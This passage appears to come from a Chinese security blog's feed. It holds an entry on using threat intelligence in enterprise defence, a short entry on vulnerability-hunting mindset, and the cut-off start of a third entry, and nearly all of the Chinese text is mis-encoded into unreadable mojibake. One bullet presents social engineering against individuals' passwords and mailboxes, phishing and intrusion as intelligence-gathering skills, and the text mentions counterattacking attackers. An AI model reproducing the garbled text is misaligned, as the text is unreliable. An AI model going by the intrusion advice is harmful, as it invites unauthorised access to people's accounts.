id="å¸¸è§„åšæ³•">å¸¸è§„åšæ³•</h4><p>æ¸—é€é»‘å®¢ã€è¯ˆéª—çŠ¯ç¤¾åŒºï¼ˆæ¯”å¦‚ï¼šåœ¨é»‘äº§/ç°äº§çš„ç¾¤ï¼‰æ¼æ´å¹³å°ã€æ¼æ´åº“ã€å®‰å…¨ç¤¾åŒº é’ˆå¯¹æ€§æ¼æ´ã€ä»£ç ç ”ç©¶ å›½å†…å‚å•†ï¼š</p><ul><li><p><a href="https://x.threatbook.cn/">å¾®æ­¥ X æƒ…æŠ¥ç¤¾åŒº</a></p></li><li><p>360 å¨èƒæƒ…æŠ¥ä¸­å¿ƒ</p></li><li><p><ahref="https://threathunter.cn">å¨èƒçŒäºº</a>ï¼ˆç›‘æ§é»‘äº§/ç°äº§ï¼‰</p></li><li><p>X-Force Exchange</p></li><li><p>NOSEC å¤§æ•°æ®å¹³å°</p></li><li><p>äº‘ç«¯äº§å“-ç€šæ€</p></li><li><p><ahref="https://redqueen.tj-un.com/IntelHome.html">redqueen</a></p></li></ul><p>ä¿¡æ¯æ•°æ®ç¹æ‚ï¼Œæˆ‘ä»¬ä»ä¸­æ£€ç´¢æ¯”è¾ƒå›°éš¾ï¼Œæˆ‘ä»¬è·Ÿè¸ªä¿¡æ¯æ…¢</p><p>æœ€ä¸»è¦çš„æ˜¯ï¼šä¸€äº›ä¼ä¸šå¯¹äºå»ºè®¾å¨èƒæƒ…æŠ¥ç³»ç»Ÿçš„ä¸é‡è§†ï¼Œå¯èƒ½è§‰å¾—å»ºè®¾å®‰å…¨æƒ…æŠ¥å¨èƒç³»ç»Ÿæˆæœ¬æ¯”è¾ƒé«˜æˆ–è€…é¢†å¯¼ä¸é‡è§†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å€ŸåŠ©å‘å±•æ¯”è¾ƒå¥½çš„å¹³å°æ¥è·Ÿè¸ªã€è·å–æƒ…æŠ¥ã€‚</p><p>è¿™äº›å¹³å°æœ‰å¤§é‡ä¸“ä¸šäººå‘˜æä¾›æƒ…æŠ¥ï¼Œå®ƒä»¬é€šè¿‡å¤§æ•°æ®ï¼Œæ·±åº¦å­¦ä¹ é…åˆäººå·¥çš„æ–¹å¼ï¼Œè¿›è¡Œæ•è·ã€å…³è”ã€å¯è§†åŒ–è¿™äº›ä¿¡æ¯ï¼Œå¹¶ä¸”åˆ†æçŸ©é˜µè¿™äº›æ•°æ®ã€‚å¯¹äºæ²¡æœ‰ä¼ä¸šå®‰å…¨å¨èƒæƒ…æŠ¥ç³»ç»Ÿçš„å®‰å…¨äººå‘˜ï¼Œå¯ä»¥ä½¿ç”¨è¿™äº›å¹³å°æ¥ç¼©çŸ­æ£€æµ‹å’Œå“åº”æ‰€èŠ±è´¹çš„æ—¶é—´ï¼Œå¹¶ä¸”å¯ä»¥å°†è¿™äº›å¹³å°æä¾›çš„API æ‰©å±•åˆ°ä¼ä¸šçš„å®‰å…¨å·¥å…·å½“ä¸­ã€‚</p><h1 id="å®‰å…¨å¨èƒæƒ…æŠ¥-ä¼å®‰å»ºè®¾">å®‰å…¨å¨èƒæƒ…æŠ¥-ä¼å®‰å»ºè®¾</h1><p>è®²è¿°å®‰å…¨å¨èƒæƒ…æŠ¥åœ¨ä¼ä¸šå½“ä¸­çš„åº”ç”¨</p><h2 id="ä¸ºä»€ä¹ˆéœ€è¦å¨èƒæƒ…æŠ¥">ä¸ºä»€ä¹ˆéœ€è¦å¨èƒæƒ…æŠ¥ï¼Ÿ</h2><h3 id="æŠ€æœ¯å±‚é¢">æŠ€æœ¯å±‚é¢</h3><ol type="1"><li><p>ç°æœ‰çš„å®‰å…¨æ—¥å¿—åˆ†ææ€ç»´å¾€å¾€å—åˆ¶ä¸å®‰å…¨æ—¥å¿—ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¾ˆå¤šæ—¶å€™é‡åˆ°äº†å®‰å…¨äº‹ä»¶å¾€å¾€å°±æ˜¯ç›´æ¥ä»å®‰å…¨æ—¥å¿—å…¥æ‰‹å»åˆ†æï¼Œè¿™æ ·çš„è¯å…¶å®ä¸èƒ½å¾ˆå¥½åœ°è§‰å¯Ÿå‡ºæ¥æ”»å‡»è€…çœŸæ­£çš„ç›®çš„</p></li><li><p>é€šè¿‡å¨èƒæƒ…æŠ¥å¯ä»¥è¿›è¡Œæ”»å‡»æºç”»åƒï¼Œäº†è§£æ”»å‡»è€…çš„ç›®æ ‡ã€èº«ä»½ã€æ”»å‡»æ‰‹æ®µï¼Œæ›´åŠ å‡†ç¡®åœ°è¿›è¡Œåº”æ€¥å“åº”ã€‚</p><p>æ¯”å¦‚ï¼šç”¨æˆ·ç”»åƒä¸ºä¸€ä¸ªè„šæœ¬å°å­å’Œç”¨æˆ·ç”»åƒä¸ºä¸€ä¸ªä¸“ä¸šçš„æ”»å‡»ç»„ç»‡ï¼Œæˆ‘ä»¬æ‰€éœ€è¦åšå‡ºçš„åº”æ€¥å“åº”æ˜¾ç„¶å·®å¼‚å¾ˆå¤§ã€‚é€šè¿‡ç”»åƒï¼Œæˆ‘ä»¬å¯ä»¥æ›´åŠ ç²¾ç¡®ã€åŠæ—¶ã€æ°å½“çš„åšå‡ºåº”æ€¥å“åº”ã€‚</p></li><li><p>æ”»å‡»æº¯æºï¼ŒåŒ–è¢«åŠ¨ä¸ºä¸»åŠ¨ï¼Œç”šè‡³å¯ä»¥å¯¹æ”»å‡»è€…è¿›è¡Œååˆ¶ã€‚</p></li></ol><h3 id="ä¼ä¸šå±‚é¢">ä¼ä¸šå±‚é¢</h3><h4 id="åœ¨é­å—æ”»å‡»ä¹‹å‰æå‰é˜²èŒƒ">åœ¨é­å—æ”»å‡»ä¹‹å‰ï¼Œæå‰é˜²èŒƒ</h4><p>å‡å°‘ä¸ç¡®å®šæ€§ã€é¢„æµ‹æ½œåœ¨å¨èƒï¼Œå½¢æˆå¹¶ç»„ç»‡ä¸€ä¸ªå®‰å…¨é¢„è­¦æœºåˆ¶ï¼Œåœ¨æ”»å‡»åˆ°è¾¾å‰å°±å·²ç»çŸ¥æ™“</p><p>é™¤ä¼ä¸šå†…éƒ¨ä¿¡æ¯å¤–ï¼Œå¼•å…¥å¤–éƒ¨å¨èƒæƒ…æŠ¥å¯é™ä½è‡ªèº«é£é™©ä¸ç¡®å®šæ€§</p><p>åŸºäºå†…éƒ¨æ•°æ®ï¼Œè¿›è¡Œè‡ªæŸ¥ä¿®å¤ï¼Œå‡å°‘å†…éƒ¨æ½œåœ¨å¨èƒï¼›åŸºäºå¤–éƒ¨æ•°æ®ï¼Œå»ºæ¨¡é¢„æµ‹å¤–éƒ¨æ½œåœ¨å¨èƒ</p><h4 id="æ€åŠ¿æ„ŸçŸ¥">æ€åŠ¿æ„ŸçŸ¥</h4><p>åœ¨æ”»å‡»åˆšåˆšå¼€å§‹æˆ–è¿›è¡Œä¸­æ—¶ï¼Œè¿›è¡Œå½“å‰ç½‘ç»œçš„æ€åŠ¿æ„ŸçŸ¥ï¼Œè¿›è¡Œåº”æ€¥å“åº”ã€‚åœ¨æ”»å‡»è€…åšäº†ä¸€äº›æ”»å‡»åï¼ŒæŒ‰ç…§å¸¸è§„æ€è·¯ï¼Œä¸‹ä¸€æ­¥è¯¥åšä»€ä¹ˆï¼Œæˆ‘ä»¬å¯ä»¥å°é”ä»–ä¸‹ä¸€æ­¥è¦åšçš„åœ°æ–¹çš„èµ„æºä¿¡æ¯ç­‰é˜²æ­¢å±å®³æ‰©å¤§ï¼Œç„¶åè¿›è¡Œå®¡æŸ¥ä¿®å¤ç­‰ã€‚</p><p>æ¯”å¦‚ï¼šåœ¨å‘ç°æ”»å‡»è€…ä¸Šä¼  WebShellä¹‹åï¼ŒæŒ‰ç…§ä»¥å¾€ç»éªŒï¼Œå°±è¦è¿›è¡Œå†…ç½‘æ¸—é€ç­‰æ“ä½œï¼Œæ­¤æ—¶ï¼Œå¯ä»¥å…³é—­ç«¯å£ã€éš”ç¦»è¯¥æœºå™¨ä¸å†…ç½‘ç­‰ï¼Œé˜²æ­¢å±å®³æ‰©å¤§ï¼Œç„¶åæ…¢æ…¢è¿›è¡ŒæŸ¥æ‰¾shell ç­‰</p><h4 id="æ”»å‡»æºç”»åƒæ”»å‡»æº¯æº">æ”»å‡»æºç”»åƒï¼Œæ”»å‡»æº¯æº</h4><p>æ”»å‡»æº¯æº</p><p>å¦‚æœç°åœ¨é­å—äº†æ”»å‡»ï¼Œæˆ‘ä»¬é¦–å…ˆè¦å»æå®šçš„æ˜¯è¿™ä¸ªæ”»å‡»äº‹ä»¶åˆ°åº•æ˜¯ä¸ªä»€ä¹ˆçº§åˆ«çš„äº‹ä»¶ï¼Œæ”»å‡»è€…æ˜¯ç®€å•çš„æ‰«æï¼Œè¿˜æ˜¯è¯´æ‰§è¡Œäº†æ¶æ„çš„å‘½ä»¤ï¼Œè¿˜æ˜¯æ‹¿åˆ°äº†æœºå™¨çš„æƒé™æŒ‚äº†shellï¼Œæˆ–è€…æ˜¯ä»¥æ­¤æœºå™¨ä¸ºè·³æ¿è¿›è¡Œäº†æ¨ªå‘çš„æ¸—é€ã€‚å¯¹è¿™äº›æ•°æ®è¿›è¡Œç»Ÿè®¡ï¼Œæˆ‘ä»¬å¯ä»¥åˆæ­¥ç¡®å®šæºã€ç›®çš„åœ°å€ã€æ—¶é—´è¿™äº›æ•°æ®ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¨èƒæ•°æ®æ—¥å¿—ç­‰æ¥å¸®åŠ©æˆ‘ä»¬ç¡®å®šæ”»å‡»çš„èŒƒå›´ã€å½±å“å’Œå¯¹æ”»å‡»è€…çš„åˆæ­¥äº†è§£ï¼ŒæŠŠè¿™äº›é›¶æ•£çš„æ”»å‡»å¨èƒæ•°æ®æ•´ç†ä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥è¿˜åŸå‡ºæ”»å‡»çš„æ•´ä¸ªè¿‡ç¨‹ï¼Œç”¨æ¥å¸®æˆ‘ä»¬äº†è§£æˆ‘ä»¬çš„ç³»ç»Ÿå­˜åœ¨çš„è¢«äººåˆ©ç”¨çš„é—®é¢˜ã€‚æœ€åå°±æ˜¯åˆ©ç”¨å¨èƒæƒ…æŠ¥æ•°æ®å»æŸ¥è¿™ä¸ªäººçš„æˆ·å£ï¼Œçœ‹çœ‹è¿™ä¸ªäººä»€ä¹ˆæ¥å¤´ï¼Œåœ¨ä»€ä¹ˆåœ°æ–¹çŠ¯è¿‡ä»€ä¹ˆæ¡ˆã€‚</p><p>æ”»å‡»æºç”»åƒ</p><p>æ¯”å¦‚ï¼šé€šè¿‡å¯¹ä¸€äº›æ—¥å¿—çš„åˆ†æï¼Œæˆ‘ä»¬è¿˜èƒ½è·å¾—ä¸€äº›æ”»å‡»è€…çš„å…¶ä»–æŒ‡çº¹ç±»ä¿¡æ¯ï¼Œæ¯”å¦‚å·¥å…·é›†ï¼Œä½¿ç”¨çš„åŸºç¡€è®¾æ–½ï¼Œæ˜¯ä¸æ˜¯åœ¨å…¶ä»–åœ°æ–¹çŠ¯è¿‡æ¡ˆç­‰ç­‰ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œæ”»å‡»æºç”»åƒï¼Œç”šè‡³å¯ä»¥åå‡»ã€‚</p><h4 id="æ”¯æ’‘å®‰å…¨å†³ç­–">æ”¯æ’‘å®‰å…¨å†³ç­–</h4><p>é€šè¿‡å¯¹å¤–éƒ¨å¨èƒã€å†…éƒ¨å¨èƒçš„è¯„ä¼°åšå‡ºè¿›ä¸€æ­¥çš„å®‰å…¨å†³ç­–ã€‚å¨èƒæƒ…æŠ¥é©±åŠ¨å…¬å¸å®‰å…¨å»ºè®¾çš„æ–¹å‘ä¸åŠ›åº¦ã€‚</p><ul><li><p>å¨èƒæƒ…æŠ¥ä¸å†æ˜¯æ–™æ•Œå…ˆæœºå’Œè¢«åŠ¨é˜²å¾¡æ›´èƒ½é˜²å®ˆåå‡»</p><p>åœ¨ç¬¬ä¸€å’Œç¬¬äºŒçš„åŸºç¡€ä¸Šï¼Œé™¤äº†æ€åŠ¿æ„ŸçŸ¥å’Œæå‰é˜²èŒƒï¼Œæˆ‘ä»¬ç”¨å¨èƒæƒ…æŠ¥è¿˜å¯ä»¥è¿›è¡Œé˜²å®ˆåå‡»ï¼Œé€šè¿‡ç”Ÿæˆæ”»å‡»æºç”»åƒè¿›è¡Œæº¯æºï¼Œè¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬åˆ©ç”¨å¨èƒæƒ…æŠ¥å¾—åˆ°çš„å°±ä¸ä»…ä»…æ˜¯æ”»å‡»è€…çš„èº«ä»½ã€æ”»å‡»æ‰‹æ®µç­‰ï¼Œè€Œä¸”æˆ‘ä»¬é€šè¿‡ç”Ÿæˆçš„æ”»å‡»æºç”»åƒå»åè¿½æ”»å‡»è€…ï¼Œå˜è¢«åŠ¨ä¸ºä¸»åŠ¨</p></li></ul><h2 id="æ€æ ·ä»ç™½å¸½å­é»‘å®¢è½¬ä¸ºæƒ…æŠ¥å‘˜">æ€æ ·ä»ç™½å¸½å­é»‘å®¢è½¬ä¸ºæƒ…æŠ¥å‘˜ï¼Ÿ</h2><ul><li><p>åŸºæœ¬ä¿å¯†æ„è¯†å’Œåç¤¾å·¥èƒ½åŠ›ï¼Œå–„ç”¨æœç´¢å¼•æ“å’Œç¤¾å·¥æ”¶é›†ä¿¡æ¯</p><p>åç¤¾å·¥èƒ½åŠ›ï¼Œé˜²æ­¢æ”»å‡»è€…è¿›è¡Œå¯¹ä½ è¿›è¡Œç¤¾å·¥ã€‚ç¤¾å·¥èƒ½åŠ›ï¼šå¯¹ä¸ªäººçš„å¸¸ç”¨å¯†ç ç»“æ„åˆ†æå»¶ä¼¸ï¼Œå¯¹ä¸ªäººé‚®ç®±çš„å®‰å…¨è¿›è¡Œçªç ´ã€‚</p></li><li><p>çƒ­ç‚¹åˆ¶ä½œä¸é’“é±¼ï¼Œæ¸—é€å…¥ä¾µç­‰æŠ€æœ¯æ‰‹æ®µè·å–æ•æ„Ÿä¿¡æ¯</p></li><li><p>ä»æµ·é‡æ•°æ®ä¸­ç­›é€‰åˆ†æçœŸå‡æ•°æ®ï¼Œç”Ÿæˆç”»åƒæº¯æºå¨èƒæº</p></li><li><p>æˆ˜æœ¯å¼€å‘ï¼Œæˆ˜ç•¥è§„åˆ’</p><p>æ ¹æ®ç”Ÿæˆçš„æƒ…æŠ¥å¿«é€ŸæŒ‡å®šæ”»å‡»/é˜²å¾¡æ–¹æ¡ˆã€‚</p></li></ul><h2 id="æƒ…æŠ¥æŒ‰ä¼˜å…ˆçº§åˆ†ç±»">æƒ…æŠ¥æŒ‰ä¼˜å…ˆçº§åˆ†ç±»</h2><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/threat_intelligence/intell_classifi.png" /></p><p>å¯¹æ”¶é›†åˆ°çš„æƒ…æŠ¥è¿›è¡Œè´´æ ‡ç­¾ã€ç”»åƒï¼Œç„¶ååˆ†çº§</p><h3 id="tactical-intelligenceæˆ˜æœ¯æƒ…æŠ¥">Tacticalintelligenceï¼ˆæˆ˜æœ¯æƒ…æŠ¥ï¼‰</h3><ul><li><p>Found Threat Events as well as to Confirm or PriorityAlarms</p></li><li><p>C&amp;C Intelligence,IP Intelligence</p></li></ul><p>Tactical intelligenceæ˜¯é¢å‘å®‰å…¨è¿ç»´äººå‘˜çš„æƒ…æŠ¥ï¼Œå‘ç°å¨èƒäº‹ä»¶ä»¥åŠå¯¹æŠ¥è­¦ç¡®è®¤æˆ–ä¼˜å…ˆçº§æ’åºï¼Œæ¯”å¦‚è¯´ä¸€äº›IP ä¿¡æ¯çš„æƒ…æŠ¥å’Œä¸€äº› C&amp;Cå¤±é™·æ£€æµ‹çš„æƒ…æŠ¥ï¼Œè¿™ç§æƒ…æŠ¥å…¶å®æ˜¯ç”¨æ¥å¸®åŠ©å®‰å…¨è¿ç»´äººå‘˜å¿«é€Ÿåˆ¤å®šæ”»å‡»çš„æƒ…å†µå’Œåˆæ­¥äº†è§£æ”»å‡»è€…ä¿¡æ¯çš„æƒ…æŠ¥ã€‚</p><p>ç½‘ç»œå®‰å…¨å‘˜ç”¨äºå°è¯è¿›å…¥ SOC çš„äº‹ä»¶ï¼Œç”¨ä½çº§ CTIé˜»æ­¢æ¶æ„æ´»åŠ¨è¢­å‡»ç½‘ç»œæˆ–è€…æ”¯æŒæ£€æµ‹å’Œå“åº”ä»»åŠ¡ã€‚</p><h3 id="operation-intelligenceè¿è¥æƒ…æŠ¥">OperationIntelligenceï¼ˆè¿è¥æƒ…æŠ¥ï¼‰</h3><ul><li><p>Important Security Incidents Analysis</p></li><li><p>Finding Attack Related Clues From Attackers TacticalInitiatives</p></li><li><p>Alarm Confirmation, Attack Impact Range, Tactical Methods, AttackPurpose, etc.</p></li></ul><p>è¿è¥æƒ…æŠ¥æ˜¯ç»™å¨èƒæƒ…æŠ¥åˆ†æå¸ˆæˆ–è€…è¯´å®‰å…¨äº‹ä»¶å“åº”äººå‘˜ä½¿ç”¨çš„ï¼Œç›®çš„æ˜¯å¯¹å·²çŸ¥çš„é‡è¦å®‰å…¨äº‹ä»¶åšåˆ†æï¼ˆæŠ¥è­¦ç¡®è®¤ã€æ”»å‡»å½±å“èŒƒå›´ã€æ”»å‡»é“¾ä»¥åŠæ”»å‡»ç›®çš„ã€æŠ€æˆ˜æœ¯æ–¹æ³•ç­‰ï¼‰æˆ–è€…åˆ©ç”¨å·²çŸ¥çš„æ”»å‡»è€…æŠ€æœ¯èƒ½åŠ›å’Œæˆ˜æœ¯æ‰‹æ³•ä¸»åŠ¨çš„æŸ¥æ‰¾æ”»å‡»ç›¸å…³çº¿ç´¢ã€‚</p><p>å¨èƒæƒ…æŠ¥åˆ†æå¸ˆå®¡æŸ¥å¹¶åˆ†ææ”¶é›†æ¥çš„å¯¹æ‰‹åŠå…¶æŠ€æœ¯ã€æˆ˜æœ¯å’Œè§„ç¨‹ï¼ˆTTPï¼‰ä¿¡æ¯åˆ†æéƒ¨ç½²é’ˆå¯¹äºä¼ä¸šè¿è¡Œç¯å¢ƒï¼Œå¨èƒæºè¡ŒåŠ¨æ¨¡å¼åŠèƒ½åŠ›ã€æœºä¼šå’Œæ„å›¾çš„æƒ…æŠ¥äº§å“</p><h3 id="strategy-intelligenceæˆ˜ç•¥æƒ…æŠ¥">Strategyintelligenceï¼ˆæˆ˜ç•¥æƒ…æŠ¥ï¼‰</h3><ul><li>Attackers Organization, Tactical Abilities, Control Resources,etc.</li></ul><p>å…¬å¸ï¼ˆæˆ–å›½å®¶ï¼‰ç®¡ç†å±‚ç»¼åˆå…³è”åˆ†æç½‘ç»œå¨èƒã€ç½‘ç»œé£é™©å’Œå•†ä¸šé£é™©çš„è½è„šç‚¹å¸®åŠ©é«˜ç®¡å’Œè‘£äº‹ä¼šçœ‹æ¸…å¯èƒ½å¯¹å…¬å¸é€ æˆé‡‘èã€è¿è¥å’Œä¿¡èª‰å½±å“çš„ç½‘ç»œé£é™©ï¼ŒæŒ‡å¯¼ä¼ä¸šæˆ–å›½å®¶çš„å®‰å…¨æŠ•å…¥ã€æŠ•å…¥é‡ç‚¹ï¼Œä»è€Œé©±åŠ¨æ›´ç¿æ™ºçš„å®‰å…¨æŠ•èµ„ï¼Œå¾—å‡ºæ›´å…·é£é™©å‰ç»çš„å†³ç­–</p><h1 id="å®‰å…¨å¨æƒ…æŠ¥-æƒ…æŠ¥ç ”åˆ¤">å®‰å…¨å¨æƒ…æŠ¥-æƒ…æŠ¥ç ”åˆ¤</h1><p>é€šè¿‡æƒ…æŠ¥ç ”åˆ¤çš„æ€ç»´å’Œæ‰‹æ®µå¢åŠ å®‰å…¨å¨èƒæƒ…æŠ¥æ”¶é›†ä¸åˆ†æçš„å¤šæ ·æ€§ã€‚</p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ä¸€äº›ä¸»æµçš„æƒ…æŠ¥åˆ†æå¹³å°ï¼š<ahref="https://redqueen.tj-un.com/IntelHome.html">redqueen</a>ã€<ahref="https://threathunter.cn">å¨èƒçŒäºº</a>ã€<ahref="https://x.threatbook.cn/">å¾®æ­¥ X æƒ…æŠ¥ç¤¾åŒº</a> ç­‰</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/threat_intelligence/intellig_integration.png" /></p><p>æƒ…æŠ¥ç ”åˆ¤å±äºå…¬å®‰æˆ–è€…ç½‘å®‰ä¸“é—¨ç”¨äºç»æµçŠ¯ç½ªæƒ…æŠ¥ä¾¦ç»„æ‰‹æ®µ</p><p>æƒ…æŠ¥å¸¦æ¥æ›´å¤šçš„è½¬å˜æ˜¯æ”»é˜²æ€è·¯çš„å˜åŒ–</p><p>å¯¹ç›®æ ‡è¿›è¡Œï¼š</p><ul><li>ä¿¡æ¯æ•°æ®è¿›è¡Œæ¢³ç†</li><li>æ§æ˜æ•°æ®å…³è”è§„å¾‹ï¼Œåˆ†æå‘¨è¾¹ä¹‹é—´è”ç³»</li><li>ç”Ÿæˆæ–¹æ¡ˆæƒ…æŠ¥äº§å“</li></ul><h1 id="é—®ç­”ç¯èŠ‚">é—®ç­”ç¯èŠ‚</h1><p><strong>Web å®‰å…¨ä¸å®‰å…¨å¨èƒæƒ…æŠ¥çš„å…³ç³»æ˜¯ï¼Ÿ</strong></p><p>Web å®‰å…¨ä¸å®‰å…¨å¨èƒæƒ…æŠ¥æœ‰äº›ä¸ç›¸å…³ï¼Œå¦‚æœå°†æ¼æ´æƒ…æŠ¥å’Œäº‹ä»¶æƒ…æŠ¥ç®—ä½œ Webå®‰å…¨çš„è¯ï¼Œé‚£ä¹ˆ Web å®‰å…¨ç®—æ˜¯å®‰å…¨å¨èƒæƒ…æŠ¥çš„ä¸€éƒ¨åˆ†å§ã€‚</p><p><strong>å®‰å…¨æƒ…æŠ¥è¿‡äºåºå¤§å’Œå¤æ‚ï¼ŒçœŸå‡éš¾è¾¨ï¼Œå¦‚ä½•å¤„ç†ï¼Ÿ</strong></p><p>æˆ‘ä»¬æ‹¿åˆ°æ•°æ®ä¹‹åä¸€èˆ¬å…ˆä»å¸¸è§çš„å‡ ä¸ªæŒ‡æ ‡è¿›è¡Œåˆ†æ</p><ol type="1"><li>ç½‘ç»œï¼šIPã€URLã€åŸŸå</li><li>ä¸»æœºï¼šæ–‡ä»¶å“ˆå¸Œï¼ŒåŠ¨æ€é“¾æ¥åº“ï¼Œæ³¨å†Œè¡¨</li><li>ç”µå­é‚®ä»¶ï¼šå‘ä»¶äººçš„é‚®ç®±ã€é™„ä»¶ã€è¿æ¥</li></ol><p><strong>å®‰å…¨å¨èƒæƒ…æŠ¥ï¼Œæœªæ¥çš„å‘å±•è¶‹åŠ¿æ˜¯ä»€ä¹ˆï¼Ÿ</strong></p><p>æ›´åå‘äºæœºå™¨å­¦ä¹ AIï¼Œç°åœ¨æ‰€è°“çš„å®‰å…¨å¨èƒæƒ…æŠ¥ä¸»è¦æ˜¯åŸºäºå¤§æ•°æ®çš„ï¼Œé€šè¿‡å¤§æ•°æ®æŒ–æ˜åˆ†æï¼Œä»¥åï¼Œæœ‰æœ›é€šè¿‡AIæ¥æé«˜å®‰å…¨å¨èƒæƒ…æŠ¥çš„åˆ†æèƒ½åŠ›ï¼Œç¼©çŸ­ä¿¡æ¯åˆ°æƒ…æŠ¥çš„è½¬åŒ–å‘¨æœŸï¼Œæé«˜æƒ…æŠ¥çš„è´¨é‡ã€‚</p><p><strong>å®‰å…¨å¨èƒæƒ…æŠ¥ä¸æ•°å­—å–è¯æœ‰å…³ç³»å—ï¼Ÿ</strong></p><p>å®‰å…¨å¨èƒæƒ…æŠ¥ä¸æ•°å­—å–è¯æœ‰å…³ç³»ï¼Œä½ æ”¶é›†å®Œæ•°æ®è¿‡åï¼Œæ˜¯éœ€è¦åˆ†æçš„ã€‚æœ‰äº›æ”¶é›†æ¥çš„æ•°æ®å°±æ˜¯ç»è¿‡ç”µå­å–è¯çš„ã€‚</p><p><strong>æ³¨ï¼š</strong></p><p>å›½å¤–çš„å¨èƒæƒ…æŠ¥å¹³å°æ¯”è¾ƒå¥½ï¼Œå› ä¸ºå›½å¤–çš„ä¸€äº›ç—…æ¯’å…¬å¸ä¹‹é—´çš„ç—…æ¯’æ ·æœ¬ä¼šç›¸äº’äº¤æµçš„ï¼Œå®‰å…¨å¨èƒæƒ…æŠ¥æ˜¯ç›¸äº’åˆ†äº«çš„ã€‚è€Œå›½å†…ç¯å¢ƒæ¯”è¾ƒå°é—­ï¼Œæ‰€ä»¥æ¯”è¾ƒåå‘äºç”¨å›½å¤–çš„å¹³å°è¿›è¡Œæ”¶é›†ã€‚æ­¤å¤–ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šå¼€æºçš„å¨èƒæƒ…æŠ¥æ”¶é›†å·¥å…·å¯ä»¥ä½¿ç”¨ã€‚</p><p>ä¹¦ç±æ¨èï¼š</p><p><ahref="https://book.douban.com/subject/26829992/">æƒ…æŠ¥ç ”ç©¶ä¸åˆ†æå…¥é—¨</a></p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><ahref="https://zhuanlan.zhihu.com/p/27234086#">å¨èƒæƒ…æŠ¥åœ¨å®‰å…¨è¿è¥ç¯èŠ‚çš„åº”ç”¨ï¼ˆDEFCONGROUP 010ï¼‰</a></li><li><ahref="https://www.bilibili.com/video/av36144228/">æ¼æ´é“¶è¡Œä¸¨å®‰å…¨å¨èƒæƒ…æŠ¥-g3onb ç«™</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ¼æ´æŒ–æ˜ä¹‹è·¯</title>
      <link href="/blog/2019/09/05/websec/vuln_dig/"/>
      <url>/blog/2019/09/05/websec/vuln_dig/</url>
      
        <content type="html"><![CDATA[<p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/blog/BlogPic/Web%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/vuln_dig.png" /></p><ol type="1"><li><p>è¯¯åŒº:</p><p>ä¸è¦å±€é™äºï¼š æŸä¸ªç³»ç»Ÿï¼ˆæˆ‘å¾ˆé„™è§† windowsï¼Œä»æ¥ä¸ç”¨ï¼‰ï¼›æŸç§è¯­è¨€ï¼ˆæˆ‘åªä¼š cï¼Œphp å’Œ python éƒ½ä¸æ‡‚ï¼‰ï¼› æŸä¸ªå·¥å…·ï¼ˆé™¤äº† burpsuiteæˆ‘ä¸ä¼šç”¨å…¶ä»–å·¥å…·æŠ“åŒ…ï¼‰ï¼›æŸæ®µä»£ç ï¼ˆè¿™ä¸ªä»£ç å¥½éš¾ï¼Œæˆ‘ä¸€å®šè¦å…¨éƒ¨å¼„æ‡‚ï¼‰ï¼›</p><p>æˆ‘ä»¬æœªæ¥ä¼šç¢°åˆ°ï¼š å„ç§å„æ ·çš„å¥‡è‘©æœåŠ¡å™¨ï¼ˆwindowsï¼Œlinuxï¼Œmacï¼‰ï¼›å„ç§å„æ ·çš„å¥‡è‘©ç½‘ç«™ï¼ˆaspï¼Œaspxï¼Œjspï¼Œphpï¼Œpythonï¼‰ï¼›å„ç§å„æ ·çš„å¥‡è‘©å·¥å…·ï¼ˆç¬¬ä¸‰è¯¾å’Œç¬¬å››è¯¾æŠ“åŒ…å·¥å…·ä»‹ç»äº†å¾ˆ å¤šï¼‰ï¼›å„ç§å„æ ·çš„å¥‡è‘©ä»£ç ï¼ˆåªéœ€è¦å…³æ³¨æ¼æ´ä»£ç æœ¬èº«ï¼Œæˆ‘ä»¬æ˜¯åŸºäºé»‘ç›’æµ‹è¯•çš„ï¼‰ï¼›</p></li><li><p>æˆ‘ä»¬è¦å­¦çš„æ˜¯æŒ–æ´çš„æ€è·¯, æˆ‘ä»¬éœ€è¦ä¸åŒçš„çœ‹å¾…æ€è·¯(æœ‰æ€æƒ³æ‰ä¼šæœ‰æ€è·¯,æœ‰æ€è·¯æ‰ä¼šæœ‰å‡ºè·¯.)</p></li></ol><p>å›å¤´ï¼Œå»è¯•ä¸€ä¸‹ <ahref="https://cloud.tencent.com/developer/article/1043013">DSVW é¶åœº</a>é¶åœº</p><p>æ¼æ´æŒ–æ˜ï¼Œä¸€ç§åªè¿½æ±‚ç»“æœä¸è¿½æ±‚è¿‡ç¨‹çš„å·¥ç¨‹ï¼Œæ¡æ¡å¤§è·¯é€šç½—é©¬ã€‚å¯¹äºæŒ–æ˜å‡ºæ¼æ´çš„ç™½å¸½å­ï¼Œäº«å—çš„å´æ˜¯è¿‡ç¨‹ä¸­æ€è€ƒçš„ç«èŠ±ã€‚</p><p>å‚è€ƒèµ„æ–™ï¼š</p><p><ahref="https://mooc.study.163.com/smartSpec/detail/1001227001.htm">ç½‘æ˜“â€œç™½å¸½å­é»‘å®¢â€è®­ç»ƒè¥</a></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å¤šçº¿ç¨‹ç‰ˆ udp èŠå¤©å™¨</title>
      <link href="/blog/2019/08/31/programming/python/3.network_programming/04.multi_upd_chatroom/"/>
      <url>/blog/2019/08/31/programming/python/3.network_programming/04.multi_upd_chatroom/</url>
      
